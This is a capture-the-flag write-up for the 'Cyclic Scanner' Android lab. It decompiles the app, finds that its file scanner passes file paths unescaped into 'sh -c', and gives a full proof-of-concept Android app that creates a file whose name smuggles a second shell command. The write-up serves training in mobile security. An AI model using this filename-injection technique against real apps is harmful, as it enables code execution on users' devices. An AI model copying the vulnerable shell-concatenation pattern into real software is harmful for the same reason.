**Description**: Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.

**Download**: https://lautarovculic.com/my_files/cyclicScanner.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-cyclic-scanner

![[cyclicScanner.png]]

Install the **APK** with **ADB**
```bash
adb install -r cyclicScanner.apk
```

Decompile it with **apktool** and let's inspect the **source code** with **jadx** (GUI version)
```bash
apktool d cyclicScanner.apk
```

Let's check the **AndroidManifest.xml** file. We can see that the **package name** is `com.mobilehackinglab.cyclicscanner`.
Also, we can see just **one activity** with is **MainActivity**.
But, looking the **source code** we can find another **two classes**.

They are in `com.mobilehackinglab.cyclicscanner.scanner`.
And the name of this classes are
**`ScanService`** and **`ScanEngine`**.

In the **`scanFile`** method, of **ScanEngine** class we can see this java code
```java
public final boolean scanFile(File file) {  
    Intrinsics.checkNotNullParameter(file, "file");  
    try {  
        String command = "toybox sha1sum " + file.getAbsolutePath();  
        Process process = new ProcessBuilder(new String[0])  
            .command("sh", "-c", command)  
            .directory(Environment.getExternalStorageDirectory())  
            .redirectErrorStream(true)  
            .start();  
        InputStream inputStream = process.getInputStream();  
        Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");  
        Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);  
        BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);  
        try {  
            BufferedReader reader = bufferedReader;  
            String output = reader.readLine();  
            Intrinsics.checkNotNull(output);  
            Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);  
            Unit unit = Unit.INSTANCE;  
            Closeable.closeFinally(bufferedReader, null);  
            return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);  
        } finally {  
        }  
    } catch (Exception e) {  
        e.printStackTrace();  
        return false;  
    }  
}
```

But, let recap some steps, and go to **MainActivity** class. We need know about the **switch**.
And here's the code:
```java
public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {
    Intrinsics.checkNotNullParameter(this$0, "this$0");
    if (isChecked) {
        Toast.makeText(this$0, "Scan service started, your device will be scanned regularly.", 0).show();
        this$0.startForegroundService(new Intent(this$0, (Class<?>) ScanService.class));
        return;
    }
}
```
When is *checked*, the **ScanService** class is loaded.
In the ScanService class we can see **loop logics that perform the scan**. Let's notice that the files that the application scans are from the **external directory**.
This can be also checked for this permission:
```XML
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

Also, we can check this with **logcat** tool.
```bash
adb logcat | grep SAFE
```
```bash
12-31 02:39:18.416 19278 19309 I System.out: /storage/emulated/0/Android/.iacovnfld....SAFE
12-31 02:39:18.447 19278 19309 I System.out: /storage/emulated/0/Music/.thumbnails/.database_uuid...SAFE
12-31 02:39:18.485 19278 19309 I System.out: /storage/emulated/0/Pictures/.thumbnails/.database_uuid...SAFE
12-31 02:39:18.511 19278 19309 I System.out: /storage/emulated/0/Pictures/dragImgs/.nomedia...SAFE
12-31 02:39:18.546 19278 19309 I System.out: /storage/emulated/0/Pictures/Screenshot.jpg...SAFE
12-31 02:39:18.575 19278 19309 I System.out: /storage/emulated/0/Movies/.thumbnails/.database_uuid...SAFE
```

Due this code
```java
for (Object element$iv : $this$forEach$iv) {
    File file = (File) element$iv;
    if (file.canRead() && file.isFile()) {
        System.out.print((Object) (file.getAbsolutePath() + "..."));
        boolean safe = ScanEngine.INSTANCE.scanFile(file);
        System.out.println((Object) (safe ? "SAFE" : "INFECTED"));
    }
}
```

So, the path where the app are looking, we'll use `/storage/emulated/0/Android`.

Let's inspect more **closer** the **ScanEngine** class
```java
public final class ScanEngine {

    /* renamed from: Companion, reason: from kotlin metadata */
    public static final Companion INSTANCE = new Companion(null);
    private static final HashMap<String, String> KNOWN_MALWARE_SAMPLES = MapsKt.hashMapOf(
        TuplesKt.to("eicar.com", "3395856ce81f2b7382dee72602f798b642f14140"),
        TuplesKt.to("eicar.com.txt", "3395856ce81f2b7382dee72602f798b642f14140"),
        TuplesKt.to("eicar_com.zip", "d27265074c9eac2e2122ed69294dbc4d7cce9141"),
        TuplesKt.to("eicarcom2.zip", "bec1b52d350d721c7e22a6d4bb0a92909893a3ae")
    );

    /* compiled from: ScanEngine.kt */
    @Metadata(d1 = {"\u0000&\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\u0010\u000e\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002J\u000e\u0010\u0007\u001a\u00020\b2\u0006\u0010\t\u001a\u00020\nR*\u0010\u0003\u001a\u001e\u0012\u0004\u0012\u00020\u0005\u0012\u0004\u0012\u00020\u00050\u0004j\u000e\u0012\u0004\u0012\u00020\u0005\u0012\u0004\u0012\u00020\u0005`\u0006X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\u000b"}, d2 = {"Lcom/mobilehackinglab/cyclicscanner/scanner/ScanEngine$Companion;", "", "()V", "KNOWN_MALWARE_SAMPLES", "Ljava/util/HashMap;", "", "Lkotlin/collections/HashMap;", "scanFile", "", "file", "Ljava/io/File;", "app_debug"}, k = 1, mv = {1, 9, 0}, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes4.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }

        public final boolean scanFile(File file) {
            Intrinsics.checkNotNullParameter(file, "file");
            try {
                String command = "toybox sha1sum " + file.getAbsolutePath();
                Process process = new ProcessBuilder(new String[0])
                    .command("sh", "-c", command)
                    .directory(Environment.getExternalStorageDirectory())
                    .redirectErrorStream(true)
                    .start();
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                try {
                    BufferedReader reader = bufferedReader;
                    String output = reader.readLine();
                    Intrinsics.checkNotNull(output);
                    Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);
                    Unit unit = Unit.INSTANCE;
                    Closeable.closeFinally(bufferedReader, null);
                    return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
                } finally {
                }
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
    }
}
```

We can found some *malware examples*. And their **checksum** respective.
But, the line of code of our interest is
```java
Process process = new ProcessBuilder(new String[0])
    .command("sh", "-c", command)
    .directory(Environment.getExternalStorageDirectory())
    .redirectErrorStream(true)
    .start();
```

Basically, every file is passed, leaving us a **RCE** vulnerability.
Then, we simply need to **create an application**, which *creates a file with the command that is passed as an argument to the application with the vulnerability*.
Like
`file = file.txt; touch lautarovculic`

So, you can find the project PoC here:
**`MainActivity.java`**
```java
package com.lautaro.cyclicrce;  
  
import android.Manifest;  
import android.content.pm.PackageManager;  
import android.os.Bundle;  
import android.util.Log;  
import android.widget.Button;  
import android.widget.Toast;  
  
import androidx.annotation.NonNull;  
import androidx.appcompat.app.AppCompatActivity;  
import androidx.core.app.ActivityCompat;  
import androidx.core.content.ContextCompat;  
  
import java.io.File;  
import java.io.FileWriter;  
import java.io.IOException;  
  
public class MainActivity extends AppCompatActivity {  
  
    private static final int PERMISSION_REQUEST_CODE = 1;  
    private static final String TAG = "PoCApp";  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        Button pocButton = findViewById(R.id.pocButton);  
  
        pocButton.setOnClickListener(v -> {  
            if (checkPermission()) {  
                createMaliciousFile();  
            } else {  
                requestPermission();  
            }  
        });  
    }  
  
    private boolean checkPermission() {  
        return ContextCompat.checkSelfPermission(  
                getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE  
        ) == PackageManager.PERMISSION_GRANTED;  
    }  
  
    private void requestPermission() {  
        ActivityCompat.requestPermissions(  
                this,  
                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},  
                PERMISSION_REQUEST_CODE  
        );  
    }  
  
    @Override  
    public void onRequestPermissionsResult(  
            int requestCode,  
            @NonNull String[] permissions,  
            @NonNull int[] grantResults  
    ) {  
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);  
        if (requestCode == PERMISSION_REQUEST_CODE) {  
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {  
                createMaliciousFile();  
            } else {  
                Toast.makeText(getApplicationContext(), "Permission Denied!", Toast.LENGTH_SHORT).show();  
            }  
        }  
    }  
  
    private void createMaliciousFile() {  
        // File name  
        String fileName = "file.txt; touch lautaro ";  
  
        // Create file  
        File file = new File("/sdcard/Download", fileName);  
  
        try {  
            boolean created = file.createNewFile();  
            if (created) {  
                FileWriter writer = new FileWriter(file);  
                writer.append("File created!");  
                writer.flush();  
                writer.close();  
                Toast.makeText(  
                        getApplicationContext(),  
                        "File Created: " + file.getAbsolutePath(),  
                        Toast.LENGTH_LONG  
                ).show();  
                Log.d(TAG, "File created: " + file.getAbsolutePath());  
            } else {  
                Toast.makeText(  
                        getApplicationContext(),  
                        "File Already Exists: " + file.getAbsolutePath(),  
                        Toast.LENGTH_LONG  
                ).show();  
                Log.d(TAG, "File already exists: " + file.getAbsolutePath());  
            }  
        } catch (IOException e) {  
            Log.e(TAG, "Failed to create file: " + e.getMessage());  
            Toast.makeText(getApplicationContext(), "Failed to create file!", Toast.LENGTH_SHORT).show();  
        }  
    }  
}
```

**`activity_main.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>  
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"  
    android:layout_width="match_parent"  
    android:layout_height="match_parent"  
    android:orientation="vertical"  
    android:gravity="center">  
  
    <Button  
        android:id="@+id/pocButton"  
        android:layout_width="wrap_content"  
        android:layout_height="wrap_content"  
        android:text="Create file" />  
  
</LinearLayout>
```

**`AndroidManifest.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
    xmlns:tools="http://schemas.android.com/tools">  
  
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>  
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>  
  
    <application  
        android:allowBackup="true"  
        android:dataExtractionRules="@xml/data_extraction_rules"  
        android:fullBackupContent="@xml/backup_rules"  
        android:icon="@mipmap/ic_launcher"  
        android:label="@string/app_name"  
        android:roundIcon="@mipmap/ic_launcher_round"  
        android:supportsRtl="true"  
        android:theme="@style/Theme.CyclicRCE"  
        tools:targetApi="31">  
        <activity  
            android:name=".MainActivity"  
            android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN" />  
                <category android:name="android.intent.category.LAUNCHER" />  
            </intent-filter>  
        </activity>  
    </application>  
</manifest>
```

This will create a file in **Download** directory `/sdcard/Download/`
Remember that in Android `/storage/emulated/0` is a **symlink**.
But, the problem here is that the **Cyclic Scanner** app just check `Android`, `Music` and `Pictures` directories.
And, in my device I can't create files in this directories with App.

![[cyclicScanner2.png]]

So, you will need move the file or just find another way ;)
I hope you found it useful (: